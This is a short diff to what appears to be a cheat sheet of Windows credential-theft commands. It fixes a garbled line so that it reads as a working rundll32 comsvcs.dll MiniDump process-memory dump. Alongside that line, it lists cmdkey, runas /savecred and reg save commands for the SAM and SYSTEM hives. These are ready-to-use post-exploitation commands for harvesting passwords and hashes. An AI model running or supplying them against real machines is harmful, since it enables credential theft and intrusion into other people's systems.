@@ -15,5 +15,5 @@ cmdkey /list
 runas /user:DOMAIN\USERNAME /savecred PATH
 reg save HKLM\SAM PATH
 reg save HKLM\SYSTEM PATH
-rundll32 C:\windows\System32\comsvcs.dll,:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID PATH full
+rundll32 C:\Windows\System32\comsvcs.dll MiniDump PID PATH full
 ]]
